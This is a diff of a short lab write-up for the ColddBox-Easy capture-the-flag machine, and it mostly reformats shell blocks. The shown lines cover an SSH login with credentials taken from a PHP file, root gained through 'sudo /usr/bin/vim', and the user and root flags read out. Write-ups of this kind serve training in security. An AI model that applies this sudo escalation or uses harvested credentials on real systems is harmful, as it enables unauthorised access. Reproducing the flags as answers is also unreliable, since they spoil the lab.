@@ -55,6 +55,7 @@ let's check a very sensitive php file with :
 
 
 let's use those creds for ssh connection
+
 `abdelhay@K4ALI:/data/vpn$ ssh c0ldd@10.10.124.265 -p 4512
 c0ldd@ColddBox-Easy:~$ cat user.txt 
 RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==`
@@ -78,17 +79,15 @@ and wirte this in
 
 and Congrats!! we're root now.
 
-`c0ldd@ColddBox-Easy:~$  sudo /usr/bin/vim
+`c0ldd@ColddBox-Easy:~$  sudo /usr/bin/vim`
 
-root@ColddBox-Easy:~# id
-uid=0(root) gid=0(root) grupos=0(root)
-root@ColddBox-Easy:~# cd /root
-root@ColddBox-Easy:/root# ls
-root.txt
-root@ColddBox-Easy:/root# cat root.txt
-wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
-root@ColddBox-Easy:/root# 
-`
+
+`root@ColddBox-Easy:/root# cat root.txt`
+
+`wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=`
+
+`root@ColddBox-Easy:/root# `
+
 
 
 
